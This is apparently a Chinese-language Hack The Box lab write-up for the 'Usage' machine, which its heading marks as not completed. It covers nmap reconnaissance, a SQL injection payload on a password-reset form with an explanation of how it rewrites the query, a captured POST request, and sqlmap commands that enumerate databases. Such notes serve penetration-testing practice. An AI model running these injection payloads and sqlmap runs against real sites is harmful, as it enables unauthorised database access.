## Usage 没通过

### burpsuite抓取的POST，Connection没有close的，可能版本升级了 | 其二email的 格式有有要求的，不会是简单的test | 所以sqlmap不成功 不往下

```
[*]$ nmap -sC -sV 10.129.146.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 04:46 CDT
Nmap scan report for 10.129.146.187
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[★]$ echo '10.192.146.187 usage.htb' | sudo tee -a /etc/hosts
10.192.146.187 usage.htb
```
#### 访问网站
![深邃的夜空有看不见的星星](images/091401.png)
#### 点击了Admin,输入了admin/admin:
![深邃的夜空有看不见的星星](images/091402.png)
#### 返回来，点击了Registe注册：
![深邃的夜空有看不见的星星](images/091403.png)
#### 梅开二度，再返回来，点击Reset Password ->输入注册时的邮箱
![深邃的夜空有看不见的星星](images/091404.png)
#### 输对了，还得继续输入邮箱，尝试一个无效的电子邮件显示：
![深邃的夜空有看不见的星星](images/091405.png)
```
test' or 1=1;-- -
```
#### 是典型的 SQL 注入 (SQL Injection) payload 示例。它的含义是：
```
![深邃的夜空有看不见的星星](images/091406.png)
test'：提前闭合了原本的字符串。
or 1=1：构造了一个总是为真的条件。
;-- -：; 结束原来的 SQL 语句，-- - 是 SQL 中的注释符号，把后面的内容全部注释掉。
```
#### 例如，如果后台原来的查询语句是：
```
SELECT * FROM users WHERE username = 'test' AND password = '123';
```
#### 被你输入这个 payload 之后，拼接后会变成：
```
SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
```
#### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
### burpsuite本地拦截
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://usage.htb/forget-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://usage.htb
DNT: 1
Connection: keep-alive
Cookie: XSRF-TOKEN=eyJpdiI6IlBSRm05eWJpV2ZRUXRmVWUyZFVmc3c9PSIsInZhbHVlIjoiWnlBRnV1cVM5VTRzSHA1RjErWVJiOEE2MnVValpmM1ZiTi9RNFZCcmpGMnRmSnlQcFpyNTN2UkR2MU9lN2xZVkM5KzNxMXVSSWV5V2t5NFR0bTdmWHFES2h1ajIrZzZnLzV5bWVlVTI4dW9XdEttUTJiMzlzd0FrYWN0WmYyUFMiLCJtYWMiOiJiNjUyNjg4NjcxM2JhYzAxZWRhZjdhMDZhOWRhNDhiYmM1MmE5M2JhOGEyZjY2NjE5YzFlMjc2N2U5ZmZkZThiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZUbHNLRlFEbUVaUGFMcW51bFJhcVE9PSIsInZhbHVlIjoiSDhnMDBHbkhvTXdwRWhxeW1WZzVSREw5OFF3Vk9xMFNjMDgzZTV4ZjFGUW9Sdm1vMFp6TVIxODFSTTlBTXh3R1lZRGxuU1dXbzlYR2tXTzZxMGVGdDFsT1ZRalFWMDM3akxWY1dHUTUzZGxOM1VwY3FYWlQ3WHZ4V3gwWnE5cUoiLCJtYWMiOiJkZGZhNzZjYThiNWYxOGUxMTQxZWU5ODMxYTA1ZmFkMGZiYzVjYWE5MTAwN2M3YzI2YWM4ZWFlNzBkMTk4M2I3IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

_token=606eDOheESHQy75Q4s4W2cp99jSsv5jRBeXAJPi3&email=test%40example.com%27
```
#### 我们复制POST请求并将其保存在一个名为reset.req，我们现在可以将其提供给sqlmap
#### 粘贴去掉末尾的%27
```
[*]$ vi reset.req
```
#### 在burpsuite复制的按键Ctrl+C
#### 粘贴到vi里面的按键Shift+Ctrl+V
```
[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B 
```
```
[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B --dbs
[★]$ find ~ | grep sqlmap
/home/syareya55/.local/share/sqlmap
/home/syareya55/.local/share/sqlmap/output
/home/syareya55/.local/share/sqlmap/output/usage.htb
/home/syareya55/.local/share/sqlmap/output/usage.htb/log
/home/syareya55/.local/share/sqlmap/output/usage.htb/target.txt
/home/syareya55/.local/share/sqlmap/history
[★]$ rm -fr /home/syareya55/.local/share/sqlmap

[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B --dbs --threads 10
```
